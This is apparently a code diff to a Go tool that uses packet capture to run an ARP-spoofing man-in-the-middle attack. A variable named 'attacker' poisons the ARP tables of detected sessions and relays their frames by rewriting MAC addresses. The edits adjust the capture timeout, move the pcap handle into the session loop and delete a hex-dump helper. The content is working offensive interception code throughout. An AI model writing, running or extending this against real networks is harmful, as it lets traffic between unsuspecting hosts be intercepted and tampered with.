@@ -6,7 +6,6 @@ import (
 	"log"
 	"math"
 	"net"
-	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -37,7 +36,7 @@ type Session struct {
 var (
 	snapshotLen = int32(math.MaxInt32)
 	promiscuous = true
-	timeout     = time.Minute
+	timeout     = time.Millisecond
 
 	options gopacket.SerializeOptions
 
@@ -53,11 +52,11 @@ func main() {
 	attacker := &Host{}
 	attacker.getLocalhostInfomation(device)
 
-	go parse(device)
+	// go parse(device)
 
-	handle := openPcap(device, "ip")
 	for session := range attacker.getSessionChan() {
 		log.Println("Session Detected.", session)
+		handle := openPcap(device, "ip")
 		go session.infect(handle, attacker)
 		go session.relay(handle, attacker)
 	}
@@ -85,7 +84,7 @@ func selectDeviceFromUser() pcap.Interface {
 func openPcap(device pcap.Interface, filter string) *pcap.Handle {
 	handle, err := pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
 	if err != nil {
-		os.Exit(1)
+		log.Fatal(err)
 	}
 	err = handle.SetBPFFilter(filter)
 	if err != nil {
@@ -177,9 +176,6 @@ func (h *Host) infinitySendARP(handle *pcap.Handle, IPs []net.IP) {
 }
 
 // func (s *Session) recovery(attacker *Host) {
-// 	handle := openPcap(device)
-// 	defer handle.Close()
-
 // 	ticker1sec := time.Tick(time.Second * 1)
 // 	ticker10sec := time.Tick(time.Second * 10)
 // 	for {
@@ -232,15 +228,6 @@ func (s *Session) infect(handle *pcap.Handle, attacker *Host) {
 }
 
 func (s *Session) relay(handle *pcap.Handle, attacker *Host) {
-	// if ring, err := pfring.NewRing(device, 65536, pfring.FlagPromisc); err != nil {
-	// 	panic(err)
-	// } else if err := ring.SetBPFFilter("ip"); err != nil {
-	// 	panic(err)
-	// } else if err := ring.Enable(); err != nil {
-	// 	panic(err)
-	// }
-	// packetSource := gopacket.NewPacketSource(ring, layers.LinkTypeEthernet)
-
 	var eth layers.Ethernet
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
@@ -254,11 +241,9 @@ func (s *Session) relay(handle *pcap.Handle, attacker *Host) {
 				}
 				switch {
 				case bytes.Equal(eth.SrcMAC, s.Sender.MAC):
-					// fmt.Print(">")
 					eth.DstMAC = s.Receiver.MAC
 					eth.SrcMAC = attacker.MAC
 				case bytes.Equal(eth.SrcMAC, s.Receiver.MAC):
-					// fmt.Print("<")
 					eth.DstMAC = s.Sender.MAC
 					eth.SrcMAC = attacker.MAC
 				default:
@@ -371,18 +356,4 @@ func (h *Host) String() string {
 		}
 		return "MAC:" + strings.Join(bufs, ":")
 	}()
-}
-
-func dump(_bytes []byte) {
-	var b bytes.Buffer
-	for i := range _bytes {
-		fmt.Fprintf(&b, "%02x ", _bytes[i])
-		i := i + 1
-		if i != 0 && i%16 == 0 {
-			fmt.Fprintf(&b, "\n")
-		} else if i != 0 && i%8 == 0 {
-			fmt.Fprintf(&b, " ")
-		}
-	}
-	fmt.Println(b.String())
 }
